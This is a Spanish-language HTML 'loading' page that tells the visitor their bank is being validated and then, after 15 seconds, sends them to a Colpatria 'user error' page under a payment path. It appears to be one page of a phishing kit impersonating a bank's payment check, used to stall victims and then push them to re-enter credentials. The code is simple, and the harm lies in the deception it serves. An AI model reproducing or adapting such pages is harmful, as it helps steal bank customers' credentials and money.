<!DOCTYPE html>
<html lang="es">
<head>
      <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
		<script src="../../scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="../../scripts/functions2.js"></script>  	
  <title>Cargando</title>
  <style>
    body {
      background: #fff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    .flip-ring-loader {
      position: relative;
      width: 250px;
      height: 250px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .flip-ring {
      position: absolute;
      left: 0; top: 0;
      width: 250px;
      height: 250px;
      border: 7px solid #e2f3ff;
      border-top: 7px solid #003C82;
      border-radius: 50%;
      box-sizing: border-box;
      animation: spin 1.15s linear infinite;
      z-index: 1;
    }
    @keyframes spin {
      0%   { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
    .flip-loader-img {
      width: 180px;
      height: 180px;
      display: block;
      animation: flipX 1.3s cubic-bezier(.4,2,.6,.9) infinite;
      transform-style: preserve-3d;
      backface-visibility: hidden;
      z-index: 2;
      position: absolute;
      left: 50%;
      top: 50%;
      transform: translate(-50%, -50%);
      background: transparent;
    }
    @keyframes flipX {
      0%   { transform: translate(-50%, -50%) rotateY(0deg);}
      40%  { transform: translate(-50%, -50%) rotateY(180deg);}
      60%  { transform: translate(-50%, -50%) rotateY(180deg);}
      100% { transform: translate(-50%, -50%) rotateY(360deg);}
    }
    .loader-message {
      margin-top: 32px;
      color: #2d4060;
      font-size: 1.18em;
      font-family: 'Montserrat', Arial, sans-serif;
      font-weight: 500;
      text-align: center;
      max-width: 340px;
      line-height: 1.4;
      letter-spacing: 0.01em;
      opacity: 0.94;
    }
  </style>
</head>
<body>
  <div class="flip-ring-loader">
    <div class="flip-ring"></div>
    <img src="/CORDESMAYO.png" alt="Loader Flip" class="flip-loader-img">
  </div>
  <div class="loader-message">
    Estamos realizando unas validaciones con su banco, espere un momento...
  </div>
<script>
  setTimeout(function() {
    window.location.href = "/pago/colpatria/errorusuario.php";
  }, 15000); // 15000 milisegundos = 15 segundos
</script>
</body>
</html>

